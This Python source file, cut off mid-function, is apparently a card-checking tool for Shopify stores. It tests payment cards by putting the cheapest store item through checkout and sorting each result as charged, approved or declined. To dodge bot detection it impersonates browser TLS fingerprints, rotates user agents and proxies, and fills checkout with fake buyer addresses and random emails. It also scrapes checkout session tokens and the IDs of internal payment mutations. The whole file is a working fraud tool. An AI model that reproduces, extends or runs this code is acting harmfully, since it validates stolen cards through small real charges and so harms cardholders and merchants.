import json
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os
from datetime import datetime
import threading 
import asyncio
import logging
_log = logging.getLogger("auto")
import hashlib
from pathlib import Path

from curl_cffi import requests
from curl_cffi.requests import Session, BrowserType

# ──────────────────────── config ─────────────────────────────────────

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    gateway: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False
    picked_variant_id: str = ""
    picked_product_id: str = ""

# ──────────────────────── Data models ────────────────────────────────

@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool

@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james",   "anderson",  "428 W 45th St",          "Apt 4B",    "New York",      "US", "NY",  "10036", "+12125550100", "gmail.com"),
    "US-CA": Address("michael","johnson", "123 Hollywood Blvd",     "Suite 100", "Los Angeles",   "US", "CA",  "90028", "+13235550100", "yahoo.com"),
    "US-TX": Address("robert","williams", "456 Main St",            "",          "Houston",       "US", "TX",  "77002", "+17135550100", "outlook.com"),
    "US-FL": Address("david", "brown",    "789 Ocean Dr",           "Apt 12",    "Miami",         "US", "FL",  "33139", "+13055550100", "hotmail.com"),
    "CA":    Address("john",  "smith",    "200 Kent St",            "",          "Ottawa",        "CA", "ON",  "K1A 0G9", "+16135550100", "gmail.com"),
    "CA-BC": Address("william","davis",   "789 Granville St",       "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9", "+16045550100", "gmail.com"),
    "GB":    Address("james", "wilson",   "10 Downing St",          "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "IN":    Address("rohan", "singh",    "Sachin Sweets Corner Nandgram Ghukna", "", "Ghaziabad", "IN", "UP", "201003", "8826800450", "gmail.com"),
    "GB-MAN":Address("oliver","martinez","123 Deansgate",           "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543", "outlook.com"),
    "AU":    Address("thomas","taylor",   "1 George St",            "",          "Sydney",        "AU", "NSW", "2000",    "+61212345678",  "gmail.com"),
    "AU-MEL":Address("daniel","anderson", "100 Collins St",         "Level 10",  "Melbourne",     "AU", "VIC", "3000",    "+61398765432",  "yahoo.com"),
    "DE":    Address("lucas", "thomas",   "Friedrichstr 100",       "",          "Berlin",        "DE", "BE",  "10117",   "+493012345678", "gmail.com"),
    "DE-MUC":Address("felix", "schmidt",  "Marienplatz 1",          "",          "Munich",        "DE", "BY",  "80331",   "+49891234567",  "gmail.com"),
    "FR":    Address("hugo",  "bernard",  "10 Rue de Rivoli",       "",          "Paris",         "FR", "IDF", "75001",   "+33112345678",  "gmail.com"),
    "FR-LY": Address("louis", "petit",    "15 Rue de la République","",          "Lyon",          "FR", "ARA", "69001",   "+33487654321",  "outlook.com"),
    "NZ":    Address("jack",  "wilson",   "1 Queen St",             "",          "Auckland",      "NZ", "AUK", "1010",    "+6491234567",   "gmail.com"),
    "NZ-WLG":Address("liam",  "brown",    "100 Willis St",          "Floor 2",   "Wellington",    "NZ", "WGN", "6011",    "+6449876543",   "gmail.com"),
    "IE":    Address("sean",  "murphy",   "1 Grafton St",           "",          "Dublin",        "IE", "D",   "D02 Y006","+35311234567",  "gmail.com"),
    "IE-CORK":Address("patrick","kelly",  "100 Patrick St",         "",          "Cork",          "IE", "CO",  "T12 XY88","+35321456789",  "gmail.com"),
    "NL":    Address("bas",   "jansen",   "Dam 1",                  "",          "Amsterdam",     "NL", "NH",  "1012 JS", "+31201234567",  "gmail.com"),
    "ES":    Address("carlos","garcia",   "Calle Mayor 1",          "",          "Madrid",        "ES", "M",   "28013",   "+34912345678",  "gmail.com"),
    "IT":    Address("marco", "rossi",    "Via Roma 1",             "",          "Rome",          "IT", "RM",  "00184",   "+39061234567",  "gmail.com"),
    "SE":    Address("erik",  "andersson","Vasagatan 1",            "",          "Stockholm",     "SE", "AB",  "111 20",  "+468123456",    "gmail.com"),
    "NO":    Address("olav",  "hansen",   "Karl Johans gate 1",     "",          "Oslo",          "NO", "03",  "0154",    "+4721234567",   "gmail.com"),
    "DK":    Address("lars",  "nielsen",  "Strøget 1",              "",          "Copenhagen",    "DK", "84",  "1457",    "+4531234567",   "gmail.com"),
    "FI":    Address("jussi", "korhonen", "Mannerheimintie 1",      "",          "Helsinki",      "FI", "18",  "00100",   "+35891234567",  "gmail.com"),
    "BE":    Address("jan",   "peeters",  "Grote Markt 1",          "",          "Brussels",      "BE", "BRU", "1000",    "+3221234567",   "gmail.com"),
    "CH":    Address("hans",  "weber",    "Bahnhofstrasse 1",       "",          "Zurich",        "CH", "ZH",  "8001",    "+41441234567",  "gmail.com"),
    "AT":    Address("markus","gruber",   "Stephansplatz 1",        "",          "Vienna",        "AT", "9",   "1010",    "+4312345678",   "gmail.com"),
    "JP":    Address("takashi","yamamoto","1-1-1 Marunouchi",       "",          "Tokyo",         "JP", "13",  "100-0005","+81312345678",  "gmail.com"),
    "SG":    Address("wei",   "tan",      "1 Raffles Place",        "#01-01",    "Singapore",     "SG", "01",  "048616",  "+6561234567",   "gmail.com"),
    "AE":    Address("ahmed", "al-mansouri","Sheikh Zayed Road 1",  "",          "Dubai",         "AE", "DU",  "12345",   "+97141234567",  "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = ["CA", "CA-BC", "GB", "GB-MAN", "AU", "AU-MEL", "DE", "DE-MUC",
                           "FR", "FR-LY", "NL", "IE", "IE-CORK", "SE", "NO", "DK",
                           "US-CA", "US-TX", "US-FL"]

EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES    = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES     = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]

def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]

def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result

# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        self.session     = Session(impersonate=impersonate, timeout=timeout)
        self.session.headers.update({
            'User-Agent':              user_agent,
            'Accept-Language':         'en-US,en;q=0.9',
            'Accept-Encoding':         'gzip, deflate, br',
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Sec-Fetch-User':          '?1',
            'Cache-Control':           'max-age=0',
        })
        if proxy_url:
            self.session.proxies = {'http': proxy_url, 'https': proxy_url}

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

# Hard-junk / non-item variants that can NEVER produce a real charge: $0.00
# virtual/gift stand-ins, donation/refund/tax chatter. These should be skipped
# by the cheap-product picker (they yield GENERIC_ERROR / AMOUNT_TOO_SMALL).
# "Price Gap Payment Link - Make up the difference" etc. ARE chargeable and
# stay candidates.
_HARD_JUNK_TITLE_MARKERS = (
    "virtual desktop", "virtual product", "gift wrap", "gift wrapping",
    "donation", "refund", "discount code", "coupon code", "tax", "duties",
    "customs", "tip for", "tip &", "wrapping", "shipping protection",
    "global-e", "which one apply to",
)

# Products below this price are rejected by Shopify as TOO_LOW_AMOUNT /
# AMOUNT_TOO_SMALL on most stores, so never auto-pick them.
_PICK_FLOOR = 0.10

import re
import json
from bs4 import BeautifulSoup
import time

_product_cache: Dict[str, tuple] = {}
_product_cache_lock = threading.Lock()
_PRODUCT_CACHE_TTL = 3600

def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.01, max_price: float | None = None) -> Tuple[str, str, str, str]:
    """
    تجيب أرخص منتج في الموقع بسعر من min_price فما فوق (بدون حد أقصى)
    بتجيب كل صفحات /products.json بالتوازي وتختار أرخص واحد
    """
    from concurrent.futures import ThreadPoolExecutor

    if max_price is None:
        max_price = float('inf')

    now = time.time()
    with _product_cache_lock:
        cached = _product_cache.get(shop_url)
        if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
            return cached[:-1]

    best_price = float('inf')
    best_product = None
    limit = 250
    max_pages = 50

    def _pick(products):
        nonlocal best_price, best_product
        floor = max(min_price, _PICK_FLOOR)
        for p in products or []:
            pt = (p.get("title", "") or "").lower()
            if any(m in pt for m in _HARD_JUNK_TITLE_MARKERS):
                continue
            for v in p.get("variants", []):
                if not v.get("available", False):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price <= 0 or price < floor or price > max_price:
                    continue
                if price < best_price:
                    best_price = price
                    best_product = (
                        p.get("title", ""),
                        str(p.get("id", "")),
                        str(v.get("id", "")),
                        v.get("price", "")
                    )

    pool = [TLSClient(client.timeout, client.proxy_url) for _ in range(8)]

    def _fetch(p):
        url = f"{shop_url}/products.json?limit={limit}&page={p}"
        try:
            resp = pool[p % len(pool)].get(url, timeout=15)
        except Exception:
            return None, None
        if resp.status_code != 200:
            return resp.status_code, None
        try:
            return 200, resp.json().get("products", [])
        except Exception:
            return 200, None

    # ===== المحاولة الأولى: products.json (كل الصفحات بالتوازي) =====
    catalog_blocked = None
    try:
        p1_status, page1 = _fetch(1)
        if page1 is None and p1_status is not None and p1_status != 200:
            catalog_blocked = p1_status
        total_pages = 1
        if page1 is not None:
            if len(page1) >= limit:
                total_pages = max_pages
                try:
                    resp = pool[0].get(f"{shop_url}/products/count.json", timeout=10)
                    if resp.status_code == 200:
                        count = int((resp.json() or {}).get("count", 0) or 0)
                        if count > len(page1):
                            total_pages = max(2, min(-(-count // limit), max_pages))
                except Exception:
                    pass
            _pick(page1)
        else:
            total_pages = max_pages

        if total_pages > 1 and page1 is not None:
            next_page = 2
            while next_page <= total_pages:
                end = min(next_page + 7, total_pages)
                with ThreadPoolExecutor(max_workers=8) as ex:
                    batch = list(ex.map(_fetch, range(next_page, end + 1)))
                last_seen = False
                for p, (st, products) in zip(range(next_page, end + 1), batch):
                    if products is None:
                        continue
                    _pick(products)
                    if len(products) < limit:
                        last_seen = True
                if last_seen:
                    break
                next_page = end + 1
    except Exception as e:
        pass  # لو فشل products.json، نكمل بالطريقة التانية

    if catalog_blocked is not None:
        raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {catalog_blocked})")
    
    # ===== المحاولة الثانية: HTML Scraping =====
    if not best_product:
        try:
            # نجيب الصفحة الرئيسية
            resp = client.get(shop_url, timeout=15)
            if resp.status_code == 200:
                html_content = resp.text
                
                # نبحث عن product cards في الـ HTML
                # Shopify بيستخدم JSON داخل الـ HTML
                json_pattern = r'<script[^>]*id="[^"]*"[^>]*>(\{.*?\})</script>'
                json_matches = re.findall(json_pattern, html_content, re.DOTALL)
                
                for json_str in json_matches:
                    try:
                        data = json.loads(json_str)
                        # نبحث عن products في الـ JSON
                        products = _extract_products_from_html_json(data)
                        for title, product_id, variant_id, price in products:
                            price_float = float(price)
                            if min_price <= price_float <= max_price:
                                if price_float < best_price:
                                    best_price = price_float
                                    best_product = (title, product_id, variant_id, price)
                    except:
                        continue
                
                # لو مش لاقي، نجيب /collections/all
                if not best_product:
                    try:
                        resp = client.get(f"{shop_url}/collections/all", timeout=15)
                        if resp.status_code == 200:
                            html_content = resp.text
                            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
                            
                            for link in product_links[:20]:  # نجرب أول 20 منتج
                                if not link.startswith('http'):
                                    link = shop_url + link
                                
                                try:
                                    resp = client.get(link, timeout=15)
                                    if resp.status_code != 200:
                                        continue
                                    
                                    product_html = resp.text
                                    
                                    # نبحث عن السعر والـ variant
                                    price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', product_html)
                                    if not price_match:
                                        continue
                                    
                                    price = float(price_match.group(1))
                                    if price < min_price or price > max_price:
                                        continue
                                    
                                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', product_html)
                                    if not variant_match:
                                        variant_match = re.search(r'data-variant-id="(\d+)"', product_html)
                                    if not variant_match:
                                        continue
                                    
                                    variant_id = variant_match.group(1)
                                    
                                    product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', product_html)
                                    product_id = product_match.group(1) if product_match else ""
                                    
                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', product_html)
                                    title = title_match.group(1) if title_match else "Product"
                                    
                                    if price < best_price:
                                        best_price = price
                                        best_product = (title, product_id, variant_id, str(price))
                                except:
                                    continue
                    except:
                        pass
        except Exception as e:
            pass
    
    if not best_product:
        if max_price == float('inf'):
            raise Exception(f"No available products at {shop_url}")
        raise Exception(f"No available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")
    
    with _product_cache_lock:
        _product_cache[shop_url] = best_product + (time.time(),)
    return best_product


def _extract_products_from_html_json(data: dict) -> List[Tuple[str, str, str, str]]:
    """استخراج المنتجات من JSON مضمّن في HTML"""
    results = []
    
    def extract(obj):
        if isinstance(obj, dict):
            # نبحث عن المنتجات
            if 'products' in obj:
                for p in obj['products']:
                    title = p.get('title', '')
                    product_id = str(p.get('id', ''))
                    for v in p.get('variants', []):
                        if v.get('available', False):
                            variant_id = str(v.get('id', ''))
                            price = v.get('price', '0')
                            results.append((title, product_id, variant_id, price))
            
            if 'product' in obj:
                p = obj['product']
                title = p.get('title', '')
                product_id = str(p.get('id', ''))
                for v in p.get('variants', []):
                    if v.get('available', False):
                        variant_id = str(v.get('id', ''))
                        price = v.get('price', '0')
                        results.append((title, product_id, variant_id, price))
            
            # نبحث في القيم
            for value in obj.values():
                extract(value)
        elif isinstance(obj, list):
            for item in obj:
                extract(item)
    
    extract(data)
    return results

# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    nav_headers = {
        "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language":           "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "referer":                   shop_url + "/",
        "sec-ch-ua":                 '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile":          "?0",
        "sec-ch-ua-platform":        '"Windows"',
        "sec-fetch-dest":            "document",
        "sec-fetch-mode":            "navigate",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-user":            "?1",
        "upgrade-insecure-requests": "1",
    }

    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp  = client.get(cart_permalink, allow_redirects=True, headers=nav_headers)

    if checkout_resp.status_code not in (200, 302):
        # Fallback: some stores block the direct permalink (403/410) but accept
        # the normal add-to-cart then cart update flow.
        try:
            add_headers = dict(nav_headers)
            add_headers.update({
                "accept":            "application/json, text/javascript, */*; q=0.01",
                "content-type":      "application/json",
                "origin":            shop_url,
                "referer":           cart_permalink,
                "x-requested-with":  "XMLHttpRequest",
                "sec-fetch-dest":    "empty",
                "sec-fetch-mode":    "cors",
                "sec-fetch-site":    "same-origin",
            })
            add_resp = client.post(
                f"{shop_url}/cart/add.js",
                json={"id": int(variant_id), "quantity": 1},
                headers=add_headers, timeout=12)
            cart_token = ""
            if add_resp.status_code in (200, 201):
                try:
                    cart_token = (add_resp.json() or {}).get("token", "") or ""
                except Exception:
                    cart_token = ""
            if not cart_token and (add_resp.status_code in (200, 201)):
                try:
                    cart_js_resp = client.get(f"{shop_url}/cart.js",
                                              headers={**nav_headers, "accept": "application/json, text/javascript, */*; q=0.01", "referer": f"{shop_url}/cart"}, timeout=12)
                    if cart_js_resp.status_code == 200:
                        try:
                            cart_token = (cart_js_resp.json() or {}).get("token", "") or ""
                        except Exception:
                            cart_token = ""
                except Exception:
                    cart_token = ""
            post_headers = dict(nav_headers)
            post_headers.update({
                "content-type": "application/x-www-form-urlencoded",
                "origin":       shop_url,
                "referer":      f"{shop_url}/cart",
            })
            cart_resp = client.post(
                f"{shop_url}/cart",
                data=f"updates%5B%5D=1&checkout=&cart_token={cart_token}",
                headers=post_headers, allow_redirects=True, timeout=12)
            if cart_resp.status_code in (200, 302) and "/checkouts/" in cart_resp.url:
                checkout_resp = cart_resp
            else:
                raise Exception(f"cart permalink returned {checkout_resp.status_code}")
        except Exception:
            raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url   = checkout_resp.url
    checkout_html  = checkout_resp.text

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""

def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"

# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + match.group(1) if match else ""

def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text

def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""

def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""

def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

# ──────────────────────── Extraction helpers ─────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""

def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True

def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""

def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""

def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""

def extract_identification_signature(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
    return match.group(1) if match else ""

def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""

def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""

# ── Currency → Country mapping (full port from app.go currencyToCountry) ──
CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "EUR": "DE", "AUD": "AU",
    "NZD": "NZ", "SGD": "SG", "HKD": "HK", "JPY": "JP", "CNY": "CN",
    "INR": "IN", "MXN": "MX", "BRL": "BR", "ARS": "AR", "CLP": "CL",
    "COP": "CO", "PEN": "PE", "VND": "VN", "THB": "TH", "IDR": "ID",
    "PHP": "PH", "MYR": "MY", "TWD": "TW", "KRW": "KR", "PKR": "PK",
    "BDT": "BD", "LKR": "LK", "NPR": "NP", "MMK": "MM", "KHR": "KH",
    "LAK": "LA", "MNT": "MN", "AFN": "AF", "IRR": "IR", "IQD": "IQ",
    "SYP": "SY", "LBP": "LB", "JOD": "JO", "SAR": "SA", "AED": "AE",
    "QAR": "QA", "KWD": "KW", "BHD": "BH", "OMR": "OM", "YER": "YE",
    "EGP": "EG", "SDG": "SD", "ETB": "ET", "KES": "KE", "UGX": "UG",
    "TZS": "TZ", "RWF": "RW", "ZMW": "ZM", "ZWL": "ZW", "MZN": "MZ",
    "NAD": "NA", "ZAR": "ZA", "BWP": "BW", "SZL": "SZ", "LSL": "LS",
    "MGA": "MG", "SCR": "SC", "MUR": "MU", "MVR": "MV", "SEK": "SE",
    "NOK": "NO", "DKK": "DK", "ISK": "IS", "CHF": "CH", "CZK": "CZ",
    "PLN": "PL", "HUF": "HU", "RON": "RO", "BGN": "BG", "HRK": "HR",
    "RSD": "RS", "BAM": "BA", "MKD": "MK", "ALL": "AL", "AMD": "AM",
    "AZN": "AZ", "GEL": "GE", "KZT": "KZ", "KGS": "KG", "TJS": "TJ",
    "TMT": "TM", "UZS": "UZ", "BYN": "BY", "UAH": "UA", "MDL": "MD",
    "RUB": "RU", "TRY": "TR", "ILS": "IL", "DZD": "DZ", "MAD": "MA",
    "TND": "TN", "LYD": "LY", "GMD": "GM", "GNF": "GN", "SLL": "SL",
    "LRD": "LR", "GHS": "GH", "NGN": "NG", "XOF": "SN", "XAF": "CM",
    "CDF": "CD", "AOA": "AO", "NIO": "NI", "HNL": "HN", "GTQ": "GT",
    "BZD": "BZ", "TTD": "TT", "JMD": "JM", "HTG": "HT", "BBD": "BB",
    "XCD": "AG", "BSD": "BS", "KYD": "KY", "BMD": "BM", "AWG": "AW",
    "BOB": "BO", "UYU": "UY", "PYG": "PY", "GYD": "GY", "SRD": "SR",
    "FJD": "FJ", "PGP": "PG", "SBD": "SB", "TOP": "TO", "WST": "WS",
    "VUV": "VU", "KPW": "KP", "MOP": "MO", "BND": "BN", "KID": "KI",
    "STN": "ST", "CVE": "CV", "MRU": "MR", "SOS": "SO", "DJF": "DJ",
    "ERN": "ER", "KMF": "KM", "BIF": "BI", "MWK": "MW",
}

_RE_CURRENCY_CART = re.compile(r'"currency"\s*:\s*"([A-Z]{3})"')

def fetch_shop_currency_sync(client, shop_url: str, headers=None) -> Tuple[str, str]:
    """
    Detect shop currency and resolve its country code.
    Tries /meta.json → /cart.js → fallback "USD"/"US". Mirrors app.go fetchCurrency.
    """
    def _apply(cur):
        return cur, CURRENCY_TO_COUNTRY.get(cur, "US")

    for path in ("/meta.json", "/cart.js"):
        try:
            resp = client.get(f"{shop_url}{path}", timeout=10)
            if resp and resp.status_code == 200:
                if path == "/meta.json":
                    cur = str((resp.json().get("currency") or "")).strip().upper()
                else:
                    m = _RE_CURRENCY_CART.search(resp.text)
                    cur = m.group(1).upper() if m else ""
                if len(cur) == 3:
                    return _apply(cur)
        except Exception:
            continue
    return "USD", "US"

# ── Gateway extraction (raw name straight from the site, no mapping) ──
_GATEWAY_PATTERNS = [
    re.compile(r'"paymentMethodIdentifier"\s*:\s*"[^"]*"\s*,\s*"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"name"\s*:\s*"([^"]+)"\s*,\s*"paymentMethodIdentifier"'),
    re.compile(r'"extensibilityDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"providerDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentProvider"\s*:\s*\{"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"gatewayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentGateway"\s*:\s*"([^"]+)"'),
    re.compile(r'"availablePaymentLines".*?"displayName"\s*:\s*"([^"]+)"'),
]

def extract_gateway_name(*bodies: str) -> str:
    """
    Return the real payment gateway name exactly as the shop reports it
    (no humanizer table). Falls back to 'Shopify Payments'.
    """
    for body in bodies:
        if not body:
            continue
        for pat in _GATEWAY_PATTERNS:
            m = pat.search(body)
            if m:
                name = m.group(1).strip()
                if name:
                    return name
    return "Shopify Payments"

def extract_delivery_from_proposal(proposal_json: str) -> Tuple[str, str]:
    """
    Robust delivery extraction used by the reference checker: read the
    seller proposal's FilledDeliveryTerms and pick the CHEAPEST
    availableDeliveryStrategies handle + its amount. Returns ("", "") when
    the proposal has no shippable delivery (digital stores).
    """
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        delivery = seller.get("delivery", {}) or {}
